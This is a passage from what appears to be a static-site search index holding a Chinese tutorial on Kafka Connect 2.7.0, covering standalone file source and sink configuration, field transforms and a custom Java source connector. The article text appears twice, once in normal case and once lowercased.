}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n\n\n> kafka stream 里面的 api 还是有必要学习一下的\n\n打成 jar 包，然后把 jar 放入 /kafka/libs 下，启动\n\nbin/kafka-run-class.sh com.example.demo.stream.tjstream\n\n\n1\n\n\n启动之后会有很多警告，不需要管，按照如上的步骤我们继续操作就行，到此就能看到输入的数据。以下是我输出的统计信息，但是 consumer 在消费的时候比较慢，不是即时的。\n\nhaha    4\nhah     1\nha      5\n\n\n1\n2\n3\n\n\n> 我们也可以使用 spring boot 来监听 streams-wordcount-output 这个 topic 来接收数据',charsets:{cjk:!0}},{title:"kafka-2.7.0 kafka Connect",frontmatter:{title:"kafka-2.7.0 kafka Connect",date:"2023-06-25T09:22:36.000Z",permalink:"/kafka/1403",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/02.%E4%B8%AD%E9%97%B4%E4%BB%B6/01.kafka/1403.kafka-2.7.0%20kafka%20Connect.html",relativePath:"02.中间件/01.kafka/1403.kafka-2.7.0 kafka Connect.md",key:"v-4b5e3128",path:"/kafka/1403/",headers:[{level:2,title:"简述",slug:"简述",normalizedTitle:"简述",charIndex:2},{level:2,title:"单机模式",slug:"单机模式",normalizedTitle:"单机模式",charIndex:547},{level:3,title:"系统文件读写",slug:"系统文件读写",normalizedTitle:"系统文件读写",charIndex:556},{level:4,title:"connect-standalone. properties",slug:"connect-standalone-properties",normalizedTitle:"connect-standalone. properties",charIndex:972},{level:4,title:"connect-file-source.properties",slug:"connect-file-source-properties",normalizedTitle:"connect-file-source.properties",charIndex:852},{level:4,title:"connect-file-sink.properties",slug:"connect-file-sink-properties",normalizedTitle:"connect-file-sink.properties",charIndex:914},{level:3,title:"启动",slug:"启动",normalizedTitle:"启动",charIndex:672},{level:4,title:"改变发送前的消息",slug:"改变发送前的消息",normalizedTitle:"改变发送前的消息",charIndex:3741},{level:3,title:"自定义 Connector",slug:"自定义-connector",normalizedTitle:"自定义 connector",charIndex:4685}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"简述 单机模式 系统文件读写 connect-standalone. properties connect-file-source.properties connect-file-sink.properties 启动 改变发送前的消息 自定义 Connector",content:'# 简述\n\nKafka Connect 是一个高伸缩性、高可靠性的数据集成工具，用于在 Apache Kafka 与其他系统间进行数据搬运以及执行 ETL 操作，比如 Kafka Connect 能够将文件系统中某些文件的内容全部灌入 Kafka topic 中或者是把 Kafka topic 中的消息导出到外部的数据库系统。\n\nKafka Connect 主要由 source connector 和 sink connector 组成，乎大部分的 ETL 框架都是由这两大类逻辑组件组成的，source connector 负责把输入数据从外部系统中导入到 Kafka 中，而 sink connector 则负责把输出数据导出到其他外部系统\n\n一个 ETL 框架或 connector 系统是否好用的主要标志之一就是，看 source connector 和 sink connector 的种类是否丰富。默认提供的 connector 越多，我们就能集成越多的外部系统，免去了用户自行开发的成本。更多的 connector 可以在 github 上去搜索，例如 kafka connector mysql，kafka connector mongodb 等，也支持自行开发。\n\n\n# 单机模式\n\n\n# 系统文件读写\n\nKafka Connect standalone 模式下通常有 3 类配置文件： connect 配置文件，若干 source connector 配置文件和若干 sink connector 配置文件。由于本例分别启动一个 source connector 读取 test.txt 剧和一个 sink connector 写入 test.sink.txt ，故 source 和 sink 配置文件都只有一个，所以总共有如下 3 个配置文件\n\n * connect-standalone.properties: connect standalone 模式下的配置文件\n * connect-file-source.properties: file source connector 配置文件\n * connect-file-sink.properties: file sink connector 配置文件\n\n# connect-standalone. properties\n\n我们首先来编辑 connect-standalone. properties 文件。实际上， Kafka 己经在 config 目录下为\n我们提供了一个该文件的模板。我们直接使用该模板井修改对应的宇段即可，如下：\n\n# 我这里一定是本地ip，原因看kafka（一）搭建\nbootstrap.servers=192.168.81.62:9092\nkey.converter=org.apache.kafka.connect.json.JsonConverter\nvalue.converter=org.apache.kafka.connect.json.JsonConverter\nkey.converter.schemas.enable=true \nvalue.converter.schemas.enable=true\noffset.storage.file.filename=/tmp/connect.offsets \noffset.flush.interval.ms=10000\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n * key value.converter：设置 Kafka 消息 key/value 的格式转化类，本例使用 JsonConverter, 即把每条 Kafka 消息转化成一个 JSON 格式\n * key/value.converter.schemas.enable：设置是否需要把数据看成纯 JSON 字符串或者 JSON 格式的对象。本例设置为 true ，即把数据转换成 JSON 对象\n * offset.storage.file.filename：connector 会定期地将状态写入底层存储中 。该参数设定了状态要被写入的底层存储文件的路径。本例使用 /tmp/connect.offsets 保存 connector 的状态。\n * offset.flush.interval.ms：保存 connector 运行中 offset 到 topic 的频率\n\n# connect-file-source.properties\n\n下面编辑 connect-file-source.properties，它在 Kafka 的 config 目录下也有一份模板，本例直接在该模板的基础上进行修改\n\nname=local-file-source\nconnector.class=FileStreamSource\ntasks.max=1\nfile=test.txt\ntopic=connect-test\n\n\n1\n2\n3\n4\n5\n\n * name：设置该 file source connector 的名称\n * connector.class：设置 source connector 类的全限定名 。有时候设置为类名 也是可以的，Kafka Connect 可以在 classpath 中自动搜寻该类并加载\n * tasks.max：每个 connector 下会创建若干个任务（ task ）执行 connector 逻辑以期望增加并行度，但对于从单个文件读 / 写数据这样的操作，任意时刻只能有一个 task 访问文件，故这里设置最大任务数为 1\n * file：输入文件全路径名。即表示该文件位于 Kafka 目录下 。实际使用时最好使用绝对路径。\n * topic：设置 source connector 把数据导入到 Kafka 的哪个 topic ，若该 topic 之前不存在，则 source connector 会自动创建。最好提前手工创建出该 topic 。\n\n# connect-file-sink.properties\n\nname=local-file-sink\nconnector.class=FileStreamSink\ntasks.max=1\nfile=test.sink.txt\ntopics=connect-test\n\n\n1\n2\n3\n4\n5\n\n * name：设置该 sink connector 名称。\n * connector.class：设置 sink connector 类的全限定名。有时候设置为类名也是可以的，Kafka Connect 可以在 classpath 中自动搜寻该类井加载。\n * tasks.max：依然设置为 1，原理与 source connector 中配置设置相同\n * file：：输出文件全路径名，即表示该文件位于 Kafka 目录下。 实际使用时最好使用绝对路径\n * topics：设置 sink connector 导出 Kafka 中的哪个 topic 的数据。\n\n\n# 启动\n\n启动 kafka 和 zookeeper\n\nbin/zookeeper-server-start.sh config/zookeeper.properties & bin/kafka-server-start.sh -daemon config/server.properties \n\n\n1\n\n\n启动 connect-standalone\n\nbin/connect-standalone.sh config/connect-standalone.properties \\\nconfig/connect-file-source.properties \\\nconfig/connect-file-sink.properties\n\n\n1\n2\n3\n\n\n在 kafka 目录下输入测试\n\necho \'hello\' >> ./test.txt\n\n\n1\n\n\n接着多出一下文件 test.sink.txt\n\n[root@localhost kafka_2.13-2.7.0]# ls\nbin  config  libs  LICENSE  logs  NOTICE  site-docs  test.sink.txt  test.txt\n\n\n1\n2\n\n\n[root@localhost kafka_2.13-2.7.0]# cat test.sink.txt \nhello\n\n\n1\n2\n\n\n> 在 spring boot 项目监听 connect-test 一样可以收到消息，如下\n> connect-test {"schema":{"type":"string","optional":false},"payload":"hello"}\n> 这里的消息实际上都是 JSON 格式的对象，这就是上面 key value.converter.schemas.enable=true 的缘故\n\n# 改变发送前的消息\n\n上面的例子只涉及 ETL 中的 E 和 L ，即数据抽取（ extract ）与加载 （load ）。作为 ETL 框架， Kafka Connect 也支持相当程度的数据转换操作 下面演示在将文件数据导出到目 标文件之前为每条消息增加一个 IP 字段 如果要插入四静态字段，我们必须修改 source connector 的配置文件，增加以下这些行：\n\ntransforms=WrapMap,InsertHost\ntransforms.WrapMap.type=org.apache.kafka.connect.transforms.HoistField$Value\ntransforms.WrapMap.field=line\ntransforms.InsertHost.type=org.apache.kafka.connect.transforms.InsertField$Value\ntransforms.InsertHost.static.field=ip\ntransforms.InsertHost.static.value=com.connector.machinel \n\n\n1\n2\n3\n4\n5\n6\n\n\n测试如下\n\n[root@localhost kafka_2.13-2.7.0]# cat test.sink.txt \nhello\n[root@localhost kafka_2.13-2.7.0]# echo \'add ip test\' >> test.txt \n[root@localhost kafka_2.13-2.7.0]# cat test.sink.txt \nhello\nStruct{line=add ip test,ip=com.connector.machinel}\n\n\n1\n2\n3\n4\n5\n6\n\n\n显然，新增的数据被封装成一个结构体 （Struct ），并增加了 ip 字段。这就是上面 WrapMap，InsertHost 的作用。 Kafka Connect 还提供了其他的转换操作，完整用法参见 https://kafka.apache.org/documentation/#connect_transforms\n\n\n# 自定义 Connector\n\n<dependency>\n    <groupId>org.apache.kafka</groupId>\n    <artifactId>connect-api</artifactId>\n</dependency>\n\n\n1\n2\n3\n4\n\n\npackage com.example.demo.source;\n\nimport com.example.demo.task.FileStreamSourceTask;\nimport org.apache.kafka.common.config.ConfigDef;\nimport org.apache.kafka.connect.connector.Task;\nimport org.apache.kafka.connect.source.SourceConnector;\n\nimport java.util.ArrayList;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\n/**\n * @author big uncle\n * @date 2021/2/26 13:44\n * @module\n **/\npublic class FileStreamSourceConnector extends SourceConnector {\n\n    private String filename;\n    private String topic;\n\n    /**\n     *这些都是配置文件里面的 key\n    **/\n    public static final String FILE_CONFIG = "file";\n    public static final String TOPIC_CONFIG = "topic";\n\n    @Override\n    public void start(Map<String, String> map) {\n        filename = map.get(FILE_CONFIG);\n        topic = map.get(TOPIC_CONFIG);\n        System.out.println("FileStreamSourceConnector.start："+map.toString());\n    }\n\n    @Override\n    public Class<? extends Task> taskClass() {\n        return FileStreamSourceTask.class;\n    }\n\n    @Override\n    public List<Map<String, String>> taskConfigs(int i) {\n        ArrayList<Map<String, String>> configs =new ArrayList<>();\n        //添加一个输入流\n        Map<String, String> config = new HashMap<>() ;\n        if(filename != null){\n            config.put(FILE_CONFIG, filename);\n        }\n        config.put(TOPIC_CONFIG, topic);\n        configs.add(config);\n        System.out.println("FileStreamSourceConnector.taskConfigs："+config.toString());\n        return configs;\n    }\n\n    @Override\n    public void stop() {\n        // 在该方法中关闭 connector 用到的外部资源\n    }\n\n    @Override\n    public ConfigDef config() {\n        System.out.println("FileStreamSourceConnector.config：");\n        return new ConfigDef();\n    }\n\n    @Override\n    public String version() {\n        return null;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n\n\npackage com.example.demo.task;\n\nimport com.example.demo.source.FileStreamSourceConnector;\nimport lombok.SneakyThrows;\nimport org.apache.kafka.connect.data.Schema;\nimport org.apache.kafka.connect.source.SourceRecord;\nimport org.apache.kafka.connect.source.SourceTask;\n\nimport java.io.*;\nimport java.util.ArrayList;\nimport java.util.Collections;\nimport java.util.List;\nimport java.util.Map;\n\n/**\n * @author big uncle\n * @date 2021/2/26 13:56\n * @module\n **/\npublic class FileStreamSourceTask extends SourceTask {\n\n    String filename;\n    FileInputStream stream;\n    String topic;\n    BufferedReader reader;\n\n    @Override\n    public String version() {\n        return null;\n    }\n\n    @SneakyThrows\n    @Override\n    public void start(Map<String, String> map) {\n        filename = map.get(FileStreamSourceConnector.FILE_CONFIG);\n        stream = new FileInputStream(filename) ;\n        topic= map.get(FileStreamSourceConnector.TOPIC_CONFIG);\n        reader = new BufferedReader(new InputStreamReader(stream));\n        System.out.println("FileStreamSourceTask.start");\n    }\n\n    /**\n     * poll是一个线程，会一直执行的\n     * @author big uncle\n     * @date 2021/2/26 17:54\n    **/\n    @Override\n    public List<SourceRecord> poll() throws InterruptedException {\n        try{\n            ArrayList<SourceRecord> records= new ArrayList<>();\n            String str = "";\n            while ((str = reader.readLine()) != null && records.isEmpty()) {\n                // sourcePartition表示记录来自的单个输入sourcePartition（例如，文件名，表名或主题分区）\n                Map<String, Object> sourcePartition = Collections.singletonMap("filename", filename);\n                // sourceOffset表示该sourcePartition中的位置，可用于恢复数据使用。\n                Map<String, Object> sourceOffset = Collections.singletonMap("position", 1);\n                // 做一个 SourceRecord 对象\n                SourceRecord sourceRecord = new SourceRecord(sourcePartition, sourceOffset,topic, Schema.STRING_SCHEMA,str);\n                // 添加到 records\n                records.add(sourceRecord);\n                System.out.println("FileStreamSourceTask.poll");\n            }\n            return records;\n        }catch(Exception e){\n            e.printStackTrace();\n        }\n        return null;\n    }\n\n    @SneakyThrows\n    @Override\n    public void stop() {\n        if(stream != null) {\n            stream.close();\n        }\n        if(reader!=null) {\n            reader.close();\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n\n\n> 我的是一个 maven 项目，整个项目就以上两个文件，打成 jar 之后，上传到 /kafka/libs 目录，然后可以重新写一个配置文件，也可以使用 connect-file-source.properties 直接修改\n\nname=local-file-source\nconnector.class=com.example.demo.source.FileStreamSourceConnector\ntasks.max=1\nfile=test.txt\ntopic=ct\n\n\n1\n2\n3\n4\n5\n\n\n启动方式和以上一样\n\n--------------------------------------- 启动日志开始 ------------------------------------------\n\n[2021-02-26 15:47:12,592] INFO REST resources initialized; server is started and ready to handle requests (org.apache.kafka.connect.runtime.rest.RestServer:319)\n[2021-02-26 15:47:12,592] INFO Kafka Connect started (org.apache.kafka.connect.runtime.Connect:57)\nFileStreamSourceConnector.config：\nFileStreamSourceConnector.config：\n\n\n1\n2\n3\n4\n\n\n[2021-02-26 15:47:12,685] INFO Instantiated connector local-file-source with version null of type class com.example.demo.source.FileStreamSourceConnector (org.apache.kafka.connect.runtime.Worker:284)\n[2021-02-26 15:47:12,687] INFO Finished creating connector local-file-source (org.apache.kafka.connect.runtime.Worker:310)\nFileStreamSourceConnector.start：{connector.class=com.example.demo.source.FileStreamSourceConnector, file=test.txt, tasks.max=1, name=local-file-source, topic=ct}\n\n\n1\n2\n3\n\n\n (org.apache.kafka.connect.runtime.ConnectorConfig$EnrichedConnectorConfig:361)\nFileStreamSourceConnector.taskConfigs：{file=test.txt, topic=ct}\n[2021-02-26 15:47:12,705] INFO Creating task local-file-source-0 (org.apache.kafka.connect.runtime.Worker:509)\n\n\n1\n2\n3\n\n\nFileStreamSourceTask.start\n[2021-02-26 15:47:12,876] INFO WorkerSourceTask{id=local-file-source-0} Source task finished initialization and start (org.apache.kafka.connect.runtime.WorkerSourceTask:233)\n[2021-02-26 15:47:12,877] INFO Created connector local-file-source (org.apache.kafka.connect.cli.ConnectStandalone:112)\nFileStreamSourceTask.poll\n\n\n1\n2\n3\n4\n\n\n--------------------------------------- 启动日志结束 ------------------------------------------\n\n[root@localhost kafka_2.13-2.7.0]# echo \'dsdsa\' >> test.txt \n[root@localhost kafka_2.13-2.7.0]# echo \'dsdsa\' >> test.txt\n\n\n1\n2\n\n\n[2021-02-26 15:50:41,049] INFO WorkerSourceTask{id=local-file-source-0} Committing offsets (org.apache.kafka.connect.runtime.WorkerSourceTask:478)\n[2021-02-26 15:50:41,050] INFO WorkerSourceTask{id=local-file-source-0} flushing 0 outstanding messages for offset commit (org.apache.kafka.connect.runtime.WorkerSourceTask:495)\n[2021-02-26 15:50:51,051] INFO WorkerSourceTask{id=local-file-source-0} Committing offsets (org.apache.kafka.connect.runtime.WorkerSourceTask:478)\n[2021-02-26 15:50:51,052] INFO WorkerSourceTask{id=local-file-source-0} flushing 0 outstanding messages for offset commit (org.apache.kafka.connect.runtime.WorkerSourceTask:495)\nFileStreamSourceTask.poll\nFileStreamSourceTask.poll\n[2021-02-26 15:51:01,052] INFO WorkerSourceTask{id=local-file-source-0} Committing offsets (org.apache.kafka.connect.runtime.WorkerSourceTask:478)\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nspring boot 接收到消息\n\n@KafkaListener(id = "myId2", topics = "ct")\npublic void listen2(String in) {\n  System.out.println("connect-test"+in);\n}\n\n\n1\n2\n3\n4\n\n\nconnect-test{"schema":{"type":"string","optional":false},"payload":"hello"},{"schema":{"type":"string","optional":false},"payload":"hello"},{"schema":{"type":"string","optional":false},"payload":"dsdsa"},{"schema":{"type":"string","optional":false},"payload":"dsdsa"},{"schema":{"type":"string","optional":false},"payload":"dsdsa"}\n\n\n1\n\n\n> 每次重启都会消费一次，遗留问题',normalizedContent:'# 简述\n\nkafka connect 是一个高伸缩性、高可靠性的数据集成工具，用于在 apache kafka 与其他系统间进行数据搬运以及执行 etl 操作，比如 kafka connect 能够将文件系统中某些文件的内容全部灌入 kafka topic 中或者是把 kafka topic 中的消息导出到外部的数据库系统。\n\nkafka connect 主要由 source connector 和 sink connector 组成，乎大部分的 etl 框架都是由这两大类逻辑组件组成的，source connector 负责把输入数据从外部系统中导入到 kafka 中，而 sink connector 则负责把输出数据导出到其他外部系统\n\n一个 etl 框架或 connector 系统是否好用的主要标志之一就是，看 source connector 和 sink connector 的种类是否丰富。默认提供的 connector 越多，我们就能集成越多的外部系统，免去了用户自行开发的成本。更多的 connector 可以在 github 上去搜索，例如 kafka connector mysql，kafka connector mongodb 等，也支持自行开发。\n\n\n# 单机模式\n\n\n# 系统文件读写\n\nkafka connect standalone 模式下通常有 3 类配置文件： connect 配置文件，若干 source connector 配置文件和若干 sink connector 配置文件。由于本例分别启动一个 source connector 读取 test.txt 剧和一个 sink connector 写入 test.sink.txt ，故 source 和 sink 配置文件都只有一个，所以总共有如下 3 个配置文件\n\n * connect-standalone.properties: connect standalone 模式下的配置文件\n * connect-file-source.properties: file source connector 配置文件\n * connect-file-sink.properties: file sink connector 配置文件\n\n# connect-standalone. properties\n\n我们首先来编辑 connect-standalone. properties 文件。实际上， kafka 己经在 config 目录下为\n我们提供了一个该文件的模板。我们直接使用该模板井修改对应的宇段即可，如下：\n\n# 我这里一定是本地ip，原因看kafka（一）搭建\nbootstrap.servers=192.168.81.62:9092\nkey.converter=org.apache.kafka.connect.json.jsonconverter\nvalue.converter=org.apache.kafka.connect.json.jsonconverter\nkey.converter.schemas.enable=true \nvalue.converter.schemas.enable=true\noffset.storage.file.filename=/tmp/connect.offsets \noffset.flush.interval.ms=10000\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n * key value.converter：设置 kafka 消息 key/value 的格式转化类，本例使用 jsonconverter, 即把每条 kafka 消息转化成一个 json 格式\n * key/value.converter.schemas.enable：设置是否需要把数据看成纯 json 字符串或者 json 格式的对象。本例设置为 true ，即把数据转换成 json 对象\n * offset.storage.file.filename：connector 会定期地将状态写入底层存储中 。该参数设定了状态要被写入的底层存储文件的路径。本例使用 /tmp/connect.offsets 保存 connector 的状态。\n * offset.flush.interval.ms：保存 connector 运行中 offset 到 topic 的频率\n\n# connect-file-source.properties\n\n下面编辑 connect-file-source.properties，它在 kafka 的 config 目录下也有一份模板，本例直接在该模板的基础上进行修改\n\nname=local-file-source\nconnector.class=filestreamsource\ntasks.max=1\nfile=test.txt\ntopic=connect-test\n\n\n1\n2\n3\n4\n5\n\n * name：设置该 file source connector 的名称\n * connector.class：设置 source connector 类的全限定名 。有时候设置为类名 也是可以的，kafka connect 可以在 classpath 中自动搜寻该类并加载\n * tasks.max：每个 connector 下会创建若干个任务（ task ）执行 connector 逻辑以期望增加并行度，但对于从单个文件读 / 写数据这样的操作，任意时刻只能有一个 task 访问文件，故这里设置最大任务数为 1\n * file：输入文件全路径名。即表示该文件位于 kafka 目录下 。实际使用时最好使用绝对路径。\n * topic：设置 source connector 把数据导入到 kafka 的哪个 topic ，若该 topic 之前不存在，则 source connector 会自动创建。最好提前手工创建出该 topic 。\n\n# connect-file-sink.properties\n\nname=local-file-sink\nconnector.class=filestreamsink\ntasks.max=1\nfile=test.sink.txt\ntopics=connect-test\n\n\n1\n2\n3\n4\n5\n\n * name：设置该 sink connector 名称。\n * connector.class：设置 sink connector 类的全限定名。有时候设置为类名也是可以的，kafka connect 可以在 classpath 中自动搜寻该类井加载。\n * tasks.max：依然设置为 1，原理与 source connector 中配置设置相同\n * file：：输出文件全路径名，即表示该文件位于 kafka 目录下。 实际使用时最好使用绝对路径\n * topics：设置 sink connector 导出 kafka 中的哪个 topic 的数据。\n\n\n# 启动\n\n启动 kafka 和 zookeeper\n\nbin/zookeeper-server-start.sh config/zookeeper.properties & bin/kafka-server-start.sh -daemon config/server.properties \n\n\n1\n\n\n启动 connect-standalone\n\nbin/connect-standalone.sh config/connect-standalone.properties \\\nconfig/connect-file-source.properties \\\nconfig/connect-file-sink.properties\n\n\n1\n2\n3\n\n\n在 kafka 目录下输入测试\n\necho \'hello\' >> ./test.txt\n\n\n1\n\n\n接着多出一下文件 test.sink.txt\n\n[root@localhost kafka_2.13-2.7.0]# ls\nbin  config  libs  license  logs  notice  site-docs  test.sink.txt  test.txt\n\n\n1\n2\n\n\n[root@localhost kafka_2.13-2.7.0]# cat test.sink.txt \nhello\n\n\n1\n2\n\n\n> 在 spring boot 项目监听 connect-test 一样可以收到消息，如下\n> connect-test {"schema":{"type":"string","optional":false},"payload":"hello"}\n> 这里的消息实际上都是 json 格式的对象，这就是上面 key value.converter.schemas.enable=true 的缘故\n\n# 改变发送前的消息\n\n上面的例子只涉及 etl 中的 e 和 l ，即数据抽取（ extract ）与加载 （load ）。作为 etl 框架， kafka connect 也支持相当程度的数据转换操作 下面演示在将文件数据导出到目 标文件之前为每条消息增加一个 ip 字段 如果要插入四静态字段，我们必须修改 source connector 的配置文件，增加以下这些行：\n\ntransforms=wrapmap,inserthost\ntransforms.wrapmap.type=org.apache.kafka.connect.transforms.hoistfield$value\ntransforms.wrapmap.field=line\ntransforms.inserthost.type=org.apache.kafka.connect.transforms.insertfield$value\ntransforms.inserthost.static.field=ip\ntransforms.inserthost.static.value=com.connector.machinel \n\n\n1\n2\n3\n4\n5\n6\n\n\n测试如下\n\n[root@localhost kafka_2.13-2.7.0]# cat test.sink.txt \nhello\n[root@localhost kafka_2.13-2.7.0]# echo \'add ip test\' >> test.txt \n[root@localhost kafka_2.13-2.7.0]# cat test.sink.txt \nhello\nstruct{line=add ip test,ip=com.connector.machinel}\n\n\n1\n2\n3\n4\n5\n6\n\n\n显然，新增的数据被封装成一个结构体 （struct ），并增加了 ip 字段。这就是上面 wrapmap，inserthost 的作用。 kafka connect 还提供了其他的转换操作，完整用法参见 https://kafka.apache.org/documentation/#connect_transforms\n\n\n# 自定义 connector\n\n<dependency>\n    <groupid>org.apache.kafka</groupid>\n    <artifactid>connect-api</artifactid>\n</dependency>\n\n\n1\n2\n3\n4\n\n\npackage com.example.demo.source;\n\nimport com.example.demo.task.filestreamsourcetask;\nimport org.apache.kafka.common.config.configdef;\nimport org.apache.kafka.connect.connector.task;\nimport org.apache.kafka.connect.source.sourceconnector;\n\nimport java.util.arraylist;\nimport java.util.hashmap;\nimport java.util.list;\nimport java.util.map;\n\n/**\n * @author big uncle\n * @date 2021/2/26 13:44\n * @module\n **/\npublic class filestreamsourceconnector extends sourceconnector {\n\n    private string filename;\n    private string topic;\n\n    /**\n     *这些都是配置文件里面的 key\n    **/\n    public static final string file_config = "file";\n    public static final string topic_config = "topic";\n\n    @override\n    public void start(map<string, string> map) {\n        filename = map.get(file_config);\n        topic = map.get(topic_config);\n        system.out.println("filestreamsourceconnector.start："+map.tostring());\n    }\n\n    @override\n    public class<? extends task> taskclass() {\n        return filestreamsourcetask.class;\n    }\n\n    @override\n    public list<map<string, string>> taskconfigs(int i) {\n        arraylist<map<string, string>> configs =new arraylist<>();\n        //添加一个输入流\n        map<string, string> config = new hashmap<>() ;\n        if(filename != null){\n            config.put(file_config, filename);\n        }\n        config.put(topic_config, topic);\n        configs.add(config);\n        system.out.println("filestreamsourceconnector.taskconfigs："+config.tostring());\n        return configs;\n    }\n\n    @override\n    public void stop() {\n        // 在该方法中关闭 connector 用到的外部资源\n    }\n\n    @override\n    public configdef config() {\n        system.out.println("filestreamsourceconnector.config：");\n        return new configdef();\n    }\n\n    @override\n    public string version() {\n        return null;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n\n\npackage com.example.demo.task;\n\nimport com.example.demo.source.filestreamsourceconnector;\nimport lombok.sneakythrows;\nimport org.apache.kafka.connect.data.schema;\nimport org.apache.kafka.connect.source.sourcerecord;\nimport org.apache.kafka.connect.source.sourcetask;\n\nimport java.io.*;\nimport java.util.arraylist;\nimport java.util.collections;\nimport java.util.list;\nimport java.util.map;\n\n/**\n * @author big uncle\n * @date 2021/2/26 13:56\n * @module\n **/\npublic class filestreamsourcetask extends sourcetask {\n\n    string filename;\n    fileinputstream stream;\n    string topic;\n    bufferedreader reader;\n\n    @override\n    public string version() {\n        return null;\n    }\n\n    @sneakythrows\n    @override\n    public void start(map<string, string> map) {\n        filename = map.get(filestreamsourceconnector.file_config);\n        stream = new fileinputstream(filename) ;\n        topic= map.get(filestreamsourceconnector.topic_config);\n        reader = new bufferedreader(new inputstreamreader(stream));\n        system.out.println("filestreamsourcetask.start");\n    }\n\n    /**\n     * poll是一个线程，会一直执行的\n     * @author big uncle\n     * @date 2021/2/26 17:54\n    **/\n    @override\n    public list<sourcerecord> poll() throws interruptedexception {\n        try{\n            arraylist<sourcerecord> records= new arraylist<>();\n            string str = "";\n            while ((str = reader.readline()) != null && records.isempty()) {\n                // sourcepartition表示记录来自的单个输入sourcepartition（例如，文件名，表名或主题分区）\n                map<string, object> sourcepartition = collections.singletonmap("filename", filename);\n                // sourceoffset表示该sourcepartition中的位置，可用于恢复数据使用。\n                map<string, object> sourceoffset = collections.singletonmap("position", 1);\n                // 做一个 sourcerecord 对象\n                sourcerecord sourcerecord = new sourcerecord(sourcepartition, sourceoffset,topic, schema.string_schema,str);\n                // 添加到 records\n                records.add(sourcerecord);\n                system.out.println("filestreamsourcetask.poll");\n            }\n            return records;\n        }catch(exception e){\n            e.printstacktrace();\n        }\n        return null;\n    }\n\n    @sneakythrows\n    @override\n    public void stop() {\n        if(stream != null) {\n            stream.close();\n        }\n        if(reader!=null) {\n            reader.close();\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n\n\n> 我的是一个 maven 项目，整个项目就以上两个文件，打成 jar 之后，上传到 /kafka/libs 目录，然后可以重新写一个配置文件，也可以使用 connect-file-source.properties 直接修改\n\nname=local-file-source\nconnector.class=com.example.demo.source.filestreamsourceconnector\ntasks.max=1\nfile=test.txt\ntopic=ct\n\n\n1\n2\n3\n4\n5\n\n\n启动方式和以上一样\n\n--------------------------------------- 启动日志开始 ------------------------------------------\n\n[2021-02-26 15:47:12,592] info rest resources initialized; server is started and ready to handle requests (org.apache.kafka.connect.runtime.rest.restserver:319)\n[2021-02-26 15:47:12,592] info kafka connect started (org.apache.kafka.connect.runtime.connect:57)\nfilestreamsourceconnector.config：\nfilestreamsourceconnector.config：\n\n\n1\n2\n3\n4\n\n\n[2021-02-26 15:47:12,685] info instantiated connector local-file-source with version null of type class com.example.demo.source.filestreamsourceconnector (org.apache.kafka.connect.runtime.worker:284)\n[2021-02-26 15:47:12,687] info finished creating connector local-file-source (org.apache.kafka.connect.runtime.worker:310)\nfilestreamsourceconnector.start：{connector.class=com.example.demo.source.filestreamsourceconnector, file=test.txt, tasks.max=1, name=local-file-source, topic=ct}\n\n\n1\n2\n3\n\n\n (org.apache.kafka.connect.runtime.connectorconfig$enrichedconnectorconfig:361)\nfilestreamsourceconnector.taskconfigs：{file=test.txt, topic=ct}\n[2021-02-26 15:47:12,705] info creating task local-file-source-0 (org.apache.kafka.connect.runtime.worker:509)\n\n\n1\n2\n3\n\n\nfilestreamsourcetask.start\n[2021-02-26 15:47:12,876] info workersourcetask{id=local-file-source-0} source task finished initialization and start (org.apache.kafka.connect.runtime.workersourcetask:233)\n[2021-02-26 15:47:12,877] info created connector local-file-source (org.apache.kafka.connect.cli.connectstandalone:112)\nfilestreamsourcetask.poll\n\n\n1\n2\n3\n4\n\n\n--------------------------------------- 启动日志结束 ------------------------------------------\n\n[root@localhost kafka_2.13-2.7.0]# echo \'dsdsa\' >> test.txt \n[root@localhost kafka_2.13-2.7.0]# echo \'dsdsa\' >> test.txt\n\n\n1\n2\n\n\n[2021-02-26 15:50:41,049] info workersourcetask{id=local-file-source-0} committing offsets 